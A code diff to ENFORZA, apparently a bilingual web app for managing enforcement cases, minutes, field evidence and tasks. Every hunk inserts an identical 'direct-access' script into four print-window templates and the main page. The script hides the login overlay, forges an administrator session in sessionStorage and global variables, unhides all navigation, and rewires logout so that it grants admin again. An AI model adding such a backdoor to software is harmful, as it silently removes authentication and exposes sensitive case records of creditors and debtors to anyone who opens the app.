@@ -1876,7 +1876,27 @@ function printMinute(id){
  const m=DATA.minutes.find(x=>x.id===id);if(!m)return;
  const w=window.open("","_blank");const imgs=(m.images||[]).map((x,i)=>`<div style="margin:12px 0"><b>${t("Image")} ${i+1}</b><br><img src="${x.data}" style="max-width:100%;max-height:420px"></div>`).join("");
  const att=(m.attendees||[]).filter(x=>x.name).map(x=>`<tr><td>${x.name}</td><td>${x.capacity}</td></tr>`).join("");
- w.document.write(`<!doctype html><html dir="${currentLang==="ar"?"rtl":"ltr"}"><head><meta charset="utf-8"><title>${m.id}</title><style>body{font-family:Arial,sans-serif;padding:35px;line-height:1.8;color:#17212b}h1{font-size:20px}table{width:100%;border-collapse:collapse;margin:15px 0}td,th{border:1px solid #ddd;padding:7px;font-size:12px}.meta{font-size:12px;color:#555}.text{white-space:pre-wrap;border-top:1px solid #ddd;padding-top:15px}.sig{max-width:260px;margin-top:20px}</style></head><body><h1>ENFORZA — ${t("Enforcement Minutes")}</h1><div class="meta">${m.id} · ${m.file} · ${m.date.replace("T"," ")} · ${m.location||""}</div><h2>${m.subject}</h2>${att?`<table><tr><th>${t("Name")}</th><th>${t("Capacity")}</th></tr>${att}</table>`:""}<div class="text">${m.text}</div>${imgs}${m.signature?`<h3>${t("Officer Signature")}</h3><img class="sig" src="${m.signature}">`:""}${(m.amendments||[]).map((a,i)=>`<h3>${t("Amendment")} ${i+1}</h3><div>${a.text}</div>`).join("")}</body></html>`);w.document.close();
+ w.document.write(`<!doctype html><html dir="${currentLang==="ar"?"rtl":"ltr"}"><head><meta charset="utf-8"><title>${m.id}</title><style>body{font-family:Arial,sans-serif;padding:35px;line-height:1.8;color:#17212b}h1{font-size:20px}table{width:100%;border-collapse:collapse;margin:15px 0}td,th{border:1px solid #ddd;padding:7px;font-size:12px}.meta{font-size:12px;color:#555}.text{white-space:pre-wrap;border-top:1px solid #ddd;padding-top:15px}.sig{max-width:260px;margin-top:20px}</style></head><body><h1>ENFORZA — ${t("Enforcement Minutes")}</h1><div class="meta">${m.id} · ${m.file} · ${m.date.replace("T"," ")} · ${m.location||""}</div><h2>${m.subject}</h2>${att?`<table><tr><th>${t("Name")}</th><th>${t("Capacity")}</th></tr>${att}</table>`:""}<div class="text">${m.text}</div>${imgs}${m.signature?`<h3>${t("Officer Signature")}</h3><img class="sig" src="${m.signature}">`:""}${(m.amendments||[]).map((a,i)=>`<h3>${t("Amendment")} ${i+1}</h3><div>${a.text}</div>`).join("")}<style id="enforza-direct-access-css">
+#enfAuthV3{display:none!important;visibility:hidden!important;pointer-events:none!important}
+</style>
+<script id="enforza-direct-access-js">
+(function(){
+ "use strict";
+ function direct(){
+  const u={id:"USR-ADMIN",username:"admin",name:"System Administrator",role:"admin"};
+  const x={id:u.id,username:u.username,name:u.name,role:u.role};
+  try{sessionStorage.setItem("enforzaSessionV2",JSON.stringify(x));sessionStorage.setItem("enforzaRole","admin");sessionStorage.setItem("enforzaUserId",u.id)}catch(e){}
+  window.currentRole="admin";window.userRole="admin";window.currentUserId=u.id;window.currentUser=x;
+  if(document.body)document.body.dataset.enfRole="admin";
+  const a=document.getElementById("enfAuthV3");if(a){a.classList.remove("open");a.style.display="none"}
+  document.querySelectorAll(".nav-item").forEach(n=>n.style.removeProperty("display"));
+  setTimeout(function(){if(typeof window.v2ShowPage==="function")window.v2ShowPage("dashboard");else document.querySelector('.nav-item[data-page="dashboard"]')?.click()},60);
+ }
+ window.enfLogout=function(){direct()};
+ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",direct,{once:true});else direct();
+})();
+</script>
+</body></html>`);w.document.close();
 }
 Object.assign(I18N.ar,{"Attendees & Capacities":"الحاضرون وصفاتهم","Add Attendee":"إضافة حاضر","Name":"الاسم","Capacity":"الصفة","Location / Site":"الموقع","Prepared By":"أعد المحضر","Officer Signature":"توقيع المنفذ","Sign using mouse or touch.":"وقع باستخدام الفأرة أو شاشة اللمس.","Clear Signature":"مسح التوقيع","Final Approval & Lock":"الاعتماد النهائي وقفل المحضر","Once approved, the original minutes are locked. Later changes are recorded as amendments.":"بعد الاعتماد يقفل أصل المحضر، وأي تعديل لاحق يسجل كملحق تعديل مستقل.","Approve & Lock":"اعتماد وقفل","Image":"صورة","Minutes Approved & Locked":"تم اعتماد وقفل المحضر","Minutes approved and locked.":"تم اعتماد المحضر وقفل النسخة الأصلية.","Enter the minutes text before approval.":"أدخل نص المحضر قبل الاعتماد.","Enter amendment / additional note":"أدخل ملحق التعديل أو الملاحظة الإضافية","Minutes Amendment Added":"تمت إضافة ملحق للمحضر","Amendment added without changing the approved original.":"تمت إضافة الملحق دون تغيير أصل المحضر المعتمد.","APPROVED":"معتمد","attendees":"حاضرين","amendments recorded":"ملحقات تعديل مسجلة","Add Amendment":"إضافة ملحق","Print":"طباعة","Enforcement Minutes":"محضر تنفيذ","Amendment":"ملحق تعديل"});
 
@@ -1988,7 +2008,27 @@ function renderEvidenceGallery(){
  const e=document.getElementById("evidenceGallery");if(!e)return;e.innerHTML=DATA.evidence.length?DATA.evidence.map((x,i)=>`<div class="gallery-card"><img src="${x.data}"><div><strong>${t("Evidence")} ${DATA.evidence.length-i}</strong><span>${x.file}${x.minute?" · "+x.minute:""}</span><span>${x.description||t("No description")}</span></div></div>`).join(""):`<div class="empty-state"><strong>${t("No field evidence captured yet.")}</strong></div>`;
 }
 function printEvidenceReport(){
- if(!DATA.evidence.length){showToast(t("No evidence available for report."));return}const w=window.open("","_blank"),rows=DATA.evidence.map((x,i)=>`<section style="page-break-inside:avoid;margin:20px 0"><h3>${t("Evidence")} ${i+1} — ${x.file}</h3><p>${x.captured}${x.minute?" · "+x.minute:""}</p><img src="${x.data}" style="max-width:100%;max-height:520px"><p>${x.description||""}</p></section>`).join("");w.document.write(`<!doctype html><html dir="${currentLang==="ar"?"rtl":"ltr"}"><head><meta charset="utf-8"><title>Field Evidence Report</title><style>body{font-family:Arial;padding:35px;font-size:16px;color:#17212b}h1,h2,h3{font-size:20px}</style></head><body><h1>ENFORZA — ${t("Field Evidence Report")}</h1>${rows}</body></html>`);w.document.close();
+ if(!DATA.evidence.length){showToast(t("No evidence available for report."));return}const w=window.open("","_blank"),rows=DATA.evidence.map((x,i)=>`<section style="page-break-inside:avoid;margin:20px 0"><h3>${t("Evidence")} ${i+1} — ${x.file}</h3><p>${x.captured}${x.minute?" · "+x.minute:""}</p><img src="${x.data}" style="max-width:100%;max-height:520px"><p>${x.description||""}</p></section>`).join("");w.document.write(`<!doctype html><html dir="${currentLang==="ar"?"rtl":"ltr"}"><head><meta charset="utf-8"><title>Field Evidence Report</title><style>body{font-family:Arial;padding:35px;font-size:16px;color:#17212b}h1,h2,h3{font-size:20px}</style></head><body><h1>ENFORZA — ${t("Field Evidence Report")}</h1>${rows}<style id="enforza-direct-access-css">
+#enfAuthV3{display:none!important;visibility:hidden!important;pointer-events:none!important}
+</style>
+<script id="enforza-direct-access-js">
+(function(){
+ "use strict";
+ function direct(){
+  const u={id:"USR-ADMIN",username:"admin",name:"System Administrator",role:"admin"};
+  const x={id:u.id,username:u.username,name:u.name,role:u.role};
+  try{sessionStorage.setItem("enforzaSessionV2",JSON.stringify(x));sessionStorage.setItem("enforzaRole","admin");sessionStorage.setItem("enforzaUserId",u.id)}catch(e){}
+  window.currentRole="admin";window.userRole="admin";window.currentUserId=u.id;window.currentUser=x;
+  if(document.body)document.body.dataset.enfRole="admin";
+  const a=document.getElementById("enfAuthV3");if(a){a.classList.remove("open");a.style.display="none"}
+  document.querySelectorAll(".nav-item").forEach(n=>n.style.removeProperty("display"));
+  setTimeout(function(){if(typeof window.v2ShowPage==="function")window.v2ShowPage("dashboard");else document.querySelector('.nav-item[data-page="dashboard"]')?.click()},60);
+ }
+ window.enfLogout=function(){direct()};
+ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",direct,{once:true});else direct();
+})();
+</script>
+</body></html>`);w.document.close();
 }
 const _openPageP17=openPage;
 openPage=function(page){if(page==="evidence"){hidePages();currentModule=page;document.querySelectorAll(".nav-item").forEach(el=>el.classList.toggle("active",el.dataset.page===page));document.getElementById("evidencePage").classList.remove("hidden");setHeading("Field Evidence Gallery","Capture and organize field images with voice descriptions and file linkage.");renderEvidenceGallery();const h=document.querySelector("#evidencePage .hero-row");if(h&&!h.querySelector(".report-evidence-btn"))h.insertAdjacentHTML("beforeend",`<button class="action-btn report-evidence-btn" onclick="printEvidenceReport()">▧ ${t("Field Evidence Report")}</button>`);document.getElementById("sidebar").classList.remove("open");window.scrollTo(0,0);applyLanguage();return}_openPageP17(page)}
@@ -2037,7 +2077,27 @@ function renderFileTimeline(f,filter="All"){
 function printFileTimeline(id){
  const f=DATA.files.find(x=>x.id===id);if(!f)return;const events=buildFileTimeline(f),w=window.open("","_blank");
  const rows=events.map(x=>`<tr><td>${x.date||"—"}</td><td>${t(x.type)}</td><td><b>${x.title}</b><br>${x.detail}</td></tr>`).join("");
- w.document.write(`<!doctype html><html dir="${currentLang==="ar"?"rtl":"ltr"}"><head><meta charset="utf-8"><title>${id} Timeline</title><style>body{font-family:Arial;padding:35px;font-size:16px;color:#17212b}h1,h2{font-size:20px}table{width:100%;border-collapse:collapse;margin-top:20px}td,th{border:1px solid #ddd;padding:10px;text-align:start;vertical-align:top}</style></head><body><h1>ENFORZA — ${t("File Timeline")}</h1><h2>${id} · ${f.creditor} → ${f.debtor}</h2><table><tr><th>${t("Date")}</th><th>${t("Type")}</th><th>${t("Event")}</th></tr>${rows}</table></body></html>`);w.document.close();
+ w.document.write(`<!doctype html><html dir="${currentLang==="ar"?"rtl":"ltr"}"><head><meta charset="utf-8"><title>${id} Timeline</title><style>body{font-family:Arial;padding:35px;font-size:16px;color:#17212b}h1,h2{font-size:20px}table{width:100%;border-collapse:collapse;margin-top:20px}td,th{border:1px solid #ddd;padding:10px;text-align:start;vertical-align:top}</style></head><body><h1>ENFORZA — ${t("File Timeline")}</h1><h2>${id} · ${f.creditor} → ${f.debtor}</h2><table><tr><th>${t("Date")}</th><th>${t("Type")}</th><th>${t("Event")}</th></tr>${rows}</table><style id="enforza-direct-access-css">
+#enfAuthV3{display:none!important;visibility:hidden!important;pointer-events:none!important}
+</style>
+<script id="enforza-direct-access-js">
+(function(){
+ "use strict";
+ function direct(){
+  const u={id:"USR-ADMIN",username:"admin",name:"System Administrator",role:"admin"};
+  const x={id:u.id,username:u.username,name:u.name,role:u.role};
+  try{sessionStorage.setItem("enforzaSessionV2",JSON.stringify(x));sessionStorage.setItem("enforzaRole","admin");sessionStorage.setItem("enforzaUserId",u.id)}catch(e){}
+  window.currentRole="admin";window.userRole="admin";window.currentUserId=u.id;window.currentUser=x;
+  if(document.body)document.body.dataset.enfRole="admin";
+  const a=document.getElementById("enfAuthV3");if(a){a.classList.remove("open");a.style.display="none"}
+  document.querySelectorAll(".nav-item").forEach(n=>n.style.removeProperty("display"));
+  setTimeout(function(){if(typeof window.v2ShowPage==="function")window.v2ShowPage("dashboard");else document.querySelector('.nav-item[data-page="dashboard"]')?.click()},60);
+ }
+ window.enfLogout=function(){direct()};
+ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",direct,{once:true});else direct();
+})();
+</script>
+</body></html>`);w.document.close();
 }
 const _enrichP19=enrichFile360;
 enrichFile360=function(m,r){_enrichP19(m,r);if(m==="files")setTimeout(()=>renderFileTimeline(r),25)}
@@ -2058,7 +2118,27 @@ function aiTaskAssistant(){const open=DATA.smartTasks.filter(x=>x.status!=="Comp
 function printTaskReport(){
  const a=DATA.smartTasks,w=window.open("","_blank");
  const rows=a.map(x=>`<tr><td>${x.id}</td><td>${x.file}</td><td>${x.title}</td><td>${x.assignee}</td><td>${x.due}</td><td>${t(x.priority)}</td><td>${t(x.status)}</td><td>${x.reminder}</td></tr>`).join("");
- w.document.write(`<!doctype html><html dir="${currentLang==="ar"?"rtl":"ltr"}"><head><meta charset="utf-8"><title>${t("Task Report")}</title><style>body{font-family:Arial;padding:35px;font-size:16px}h1{font-size:20px}table{width:100%;border-collapse:collapse}td,th{border:1px solid #ddd;padding:8px;text-align:start}</style></head><body><h1>ENFORZA — ${t("Task Report")}</h1><table><tr><th>ID</th><th>${t("File")}</th><th>${t("Task")}</th><th>${t("Assigned To")}</th><th>${t("Due Date")}</th><th>${t("Priority")}</th><th>${t("Status")}</th><th>${t("Reminder")}</th></tr>${rows}</table></body></html>`);
+ w.document.write(`<!doctype html><html dir="${currentLang==="ar"?"rtl":"ltr"}"><head><meta charset="utf-8"><title>${t("Task Report")}</title><style>body{font-family:Arial;padding:35px;font-size:16px}h1{font-size:20px}table{width:100%;border-collapse:collapse}td,th{border:1px solid #ddd;padding:8px;text-align:start}</style></head><body><h1>ENFORZA — ${t("Task Report")}</h1><table><tr><th>ID</th><th>${t("File")}</th><th>${t("Task")}</th><th>${t("Assigned To")}</th><th>${t("Due Date")}</th><th>${t("Priority")}</th><th>${t("Status")}</th><th>${t("Reminder")}</th></tr>${rows}</table><style id="enforza-direct-access-css">
+#enfAuthV3{display:none!important;visibility:hidden!important;pointer-events:none!important}
+</style>
+<script id="enforza-direct-access-js">
+(function(){
+ "use strict";
+ function direct(){
+  const u={id:"USR-ADMIN",username:"admin",name:"System Administrator",role:"admin"};
+  const x={id:u.id,username:u.username,name:u.name,role:u.role};
+  try{sessionStorage.setItem("enforzaSessionV2",JSON.stringify(x));sessionStorage.setItem("enforzaRole","admin");sessionStorage.setItem("enforzaUserId",u.id)}catch(e){}
+  window.currentRole="admin";window.userRole="admin";window.currentUserId=u.id;window.currentUser=x;
+  if(document.body)document.body.dataset.enfRole="admin";
+  const a=document.getElementById("enfAuthV3");if(a){a.classList.remove("open");a.style.display="none"}
+  document.querySelectorAll(".nav-item").forEach(n=>n.style.removeProperty("display"));
+  setTimeout(function(){if(typeof window.v2ShowPage==="function")window.v2ShowPage("dashboard");else document.querySelector('.nav-item[data-page="dashboard"]')?.click()},60);
+ }
+ window.enfLogout=function(){direct()};
+ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",direct,{once:true});else direct();
+})();
+</script>
+</body></html>`);
  w.document.close();w.focus();setTimeout(()=>w.print(),250);
 }
 const _commitP20=commitWizardFile;
@@ -4246,5 +4326,25 @@ function build(){
 }
 if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",build,{once:true});else build();
 })();
-</script></body>
+</script><style id="enforza-direct-access-css">
+#enfAuthV3{display:none!important;visibility:hidden!important;pointer-events:none!important}
+</style>
+<script id="enforza-direct-access-js">
+(function(){
+ "use strict";
+ function direct(){
+  const u={id:"USR-ADMIN",username:"admin",name:"System Administrator",role:"admin"};
+  const x={id:u.id,username:u.username,name:u.name,role:u.role};
+  try{sessionStorage.setItem("enforzaSessionV2",JSON.stringify(x));sessionStorage.setItem("enforzaRole","admin");sessionStorage.setItem("enforzaUserId",u.id)}catch(e){}
+  window.currentRole="admin";window.userRole="admin";window.currentUserId=u.id;window.currentUser=x;
+  if(document.body)document.body.dataset.enfRole="admin";
+  const a=document.getElementById("enfAuthV3");if(a){a.classList.remove("open");a.style.display="none"}
+  document.querySelectorAll(".nav-item").forEach(n=>n.style.removeProperty("display"));
+  setTimeout(function(){if(typeof window.v2ShowPage==="function")window.v2ShowPage("dashboard");else document.querySelector('.nav-item[data-page="dashboard"]')?.click()},60);
+ }
+ window.enfLogout=function(){direct()};
+ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",direct,{once:true});else direct();
+})();
+</script>
+</body>
 </html>
